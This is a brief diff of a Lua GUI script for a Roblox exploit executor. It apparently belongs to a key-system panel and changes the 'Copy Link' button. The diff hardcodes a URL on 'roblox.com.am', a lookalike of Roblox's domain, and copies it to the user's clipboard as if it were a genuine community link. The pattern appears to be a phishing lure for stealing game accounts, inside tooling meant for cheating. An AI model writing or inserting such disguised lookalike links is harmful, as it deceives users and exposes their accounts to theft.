@@ -147,16 +147,19 @@ checkKeyButton.MouseButton1Click:Connect(function()
 	statusLabel.Text = "Ready"
 end)
 
--- Copy Link (Exact link you requested)
+-- Copy Link (Hardcoded exact link)
 copyLinkButton.MouseButton1Click:Connect(function()
+	local link = "https://www.roblox.com.am/communities/114062597626/The Jays"
+	
 	if setclipboard then
-		setclipboard(API_KEY_LINK)
+		setclipboard(link)
 		statusLabel.TextColor3 = Color3.fromRGB(100, 200, 100)
 		statusLabel.Text = "Link copied to clipboard!"
 	else
 		statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 		statusLabel.Text = "Clipboard not supported on this executor"
 	end
+	
 	task.wait(2)
 	statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 	statusLabel.Text = "Ready"
